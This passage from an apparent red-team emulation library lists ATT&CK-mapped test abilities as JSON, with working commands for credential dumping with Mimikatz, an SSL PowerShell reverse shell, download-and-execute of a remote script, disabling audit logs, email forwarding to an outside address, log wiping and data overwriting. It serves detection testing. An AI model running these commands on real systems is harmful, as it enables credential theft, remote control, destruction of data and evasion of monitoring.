(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "ef943918da20ee40d378ad000bbcc3b7", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Obfuscation Tests", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n", "repeatable": false, "privilege": "", "buckets": ["initial-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["schtasks /delete /tn ExplorerSync /F 2>null && del %temp%\\..\\Microsoft\\ExplorerSync.db 2>null && del %temp%\\ExplorerSync.db 2>null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db && schtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Supply Chain Compromise", "ability_id": "4f0c66956fc56e1ab11f4a1e394a4fd0", "technique_id": "T1195", "tactic": "initial-access", "requirements": [], "name": "Octopus Scanner Malware Open Source Supply Chain", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute arbitrary DLL file stored locally.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Odbcconf", "ability_id": "f6f3109375020c484e291ac3668f38af", "technique_id": "T1218.008", "tactic": "defense-evasion", "requirements": [], "name": "Odbcconf.exe - Execute Arbitrary DLL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd PathToAtomicsFolder\\T1218.008\\bin\\ && odbcconf.exe -f T1218.008.rsp", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Odbcconf", "ability_id": "2fae8daf5c8d30455c0055c26248c661", "technique_id": "T1218.008", "tactic": "defense-evasion", "requirements": [], "name": "Odbcconf.exe - Load Response File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Cloud Logs", "ability_id": "eb9de85953f93fc247c48f1b236839fc", "technique_id": "T1562.008", "tactic": "defense-evasion", "requirements": [], "name": "Office 365 - Exchange Audit Log Disabled", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /f >nul 2>&1 && del %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f && mkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1 && echo \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Office Application Startup", "ability_id": "12ad9edefc86af07700fbf49bfdac6ba", "technique_id": "T1137", "tactic": "persistence", "requirements": [], "name": "Office Application Startup - Outlook as a C2", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"C:\\Users\\$env:username\\Desktop\\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macroCode = Get-Content \"#{macro_path}\" -Raw; $URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"; $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"; Invoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "ca3c058554276f34ac84b996af0caf0d", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "Office Generic Payload Download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"$(\"$env:temp\\art1204.bat\")`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $bat_path `\", vbNormalFocus)`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct Word", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "705c4b9714ce06223e7d7038cd332808", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "Office launching .bat file from AppData", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Get-InboxRule | Where-Object { $_.Name -eq \"Atomic Red Team Email Rule\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; New-InboxRule -Name \"Atomic Red Team Email Rule\" -ForwardTo \"Atomic_Operator@fakeemail.aq\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Email Collection: Email Forwarding Rule", "ability_id": "e947c2f5e248a8bbfe0e26b5bf688109", "technique_id": "T1114.003", "tactic": "collection", "requirements": [], "name": "Office365 - Email Forwarding", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1003.001\\bin\\x64\\mimikatz.exe \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: LSASS Memory", "ability_id": "2b20abe4020074cc3598e28dcf41d1bc", "technique_id": "T1003.001", "tactic": "credential-access", "requirements": [], "name": "Offline Credential Theft With Mimikatz", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will attempt to open a local port defined by input arguments to any profile", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["netsh advfirewall firewall delete rule name=\"Open Port to Any\" | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "9378f5d52c7f94cd08f407f8c0a5fbd7", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Open a local port through Windows Firewall to any profile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$server_ip =; $server_port =; $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); $stream = $socket.GetStream(); $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); $sslStream.AuthenticateAsClient('fakedomain.example', $null, \"Tls12\", $false); $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Encrypted Channel", "ability_id": "fb827394b296192cb7a81031a2e37ae2", "technique_id": "T1573", "tactic": "command-and-control", "requirements": [], "name": "OpenSSL C2", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["netsh advfirewall firewall delete rule name=\"atomic testing\" protocol=TCP localport=450 >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "bd5ee87126c38b409c12f823ec4469c2", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Opening ports for proxy - HARDRAIN", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo 0> /var/log/secure", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "6b895fe897f459d889a8506746095cf7", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Overwrite Linux Log", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo 0> /var/spool/mail/root", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "9e1fc72961c8e98bc89feeac0b6652e2", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Overwrite Linux Mail Spool", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use the `shred` command to overwrite the temporary file and then delete it\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "shred -u /tmp/victim-shred.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: File Deletion", "ability_id": "03a0a74a1396a51c5cb607e787070048", "technique_id": "T1070.004", "tactic": "defense-evasion", "requirements": [], "name": "Overwrite and delete a file with shred", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cipher.exe /w:C:", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Data Destruction", "ability_id": "66f19707907a88df172057c131ae2168", "technique_id": "T1485", "tactic": "impact", "requirements": [], "name": "Overwrite deleted data on C drive", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test overwrites the contents of system log file with an empty string using echo utility\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo echo '' > /var/log/system.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "7a0e720d1f695b05af9f1b9cfb83d481", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Overwrite macOS system log via echo utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may use PDQ Deploy Software to deploy the Remote Adminstartion Tool, this will start the PDQ console.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Software Deployment Tools", "ability_id": "41d1aa5e9ab0eb27bf8f9fb0f43ac0ab", "technique_id": "T1072", "tactic": "multiple", "requirements": [], "name": "PDQ Deploy RAT", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/t1040_linux_pcapdemo"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "dc594307cc6b1ed451b35e51f192dbac", "technique_id": "T1040", "tactic": "multiple", "requirements": [], "name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/t1040_linux_pcapdemo"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "23a55c307920b731e16aa89f32d18f7a", "technique_id": "T1040", "tactic": "multiple", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/t1040_linux_pcapdemo"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo /tmp/t1040_linux_pcapdemo -a -f -t 3", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "7ebfbb078ecbc1808b6539325f9b4f6d", "technique_id": "T1040", "tactic": "multiple", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["053c10_AllTheThings.iso"], "parsers": [], "cleanup": ["rm -f /tmp/t1040_linux_pcapdemo"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo /tmp/t1040_linux_pcapdemo -a -t 3", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "36d1f9546258d3a8ca9489853597acd3", "technique_id": "T1040", "tactic": "multiple", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tcpdump -c 5 -nnni ens33; tshark -c 5 -i ens33", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "3b2764c4c99a4adec2c68dc264d9e6c4", "technique_id": "T1040", "tactic": "multiple", "requirements": [], "name": "Packet Capture Linux using tshark or tcpdump", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet -c 5", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "2125c8629020f136ed11d2124dc76d2c", "technique_id": "T1040", "tactic": "multiple", "requirements": [], "name": "Packet Capture Windows Command Prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/t1040_macos_pcapdemo"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo /tmp/t1040_macos_pcapdemo -i en0 -t 3", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "8694818da4f9da7580fdb477b6a3685a", "technique_id": "T1040", "tactic": "multiple", "requirements": [{"relationship_match": [{"source": "sudo"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Packet Capture macOS using /dev/bpfN with sudo", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo tcpdump -c 5 -nnni en0A    ; if [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Network Sniffing", "ability_id": "79cc22aa5dd3e0e7dba90a3d0cfa1f0c", "technique_id": "T1040", "tactic": "multiple", "requirements": [], "name": "Packet Capture macOS using tcpdump or tshark", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/evil-binary"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/evil-binary"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Binary Padding", "ability_id": "1003589b9e99d9edbd22cdcd56394f53", "technique_id": "T1027.001", "tactic": "defense-evasion", "requirements": [], "name": "Pad Binary to Change Hash - Linux/macOS dd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/evil-binary"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "truncate -s +1 /tmp/evil-binary", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/evil-binary"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "truncate -s +1 /tmp/evil-binary", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Binary Padding", "ability_id": "5c922d92f383656401d5633ca23db497", "technique_id": "T1027.001", "tactic": "defense-evasion", "requirements": [], "name": "Pad Binary to Change Hash using truncate command - Linux/macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Spawns a powershell.exe process as a child of the current process.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -CommandLine '-Command Start-Sleep 10' -ParentId $PID", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Parent 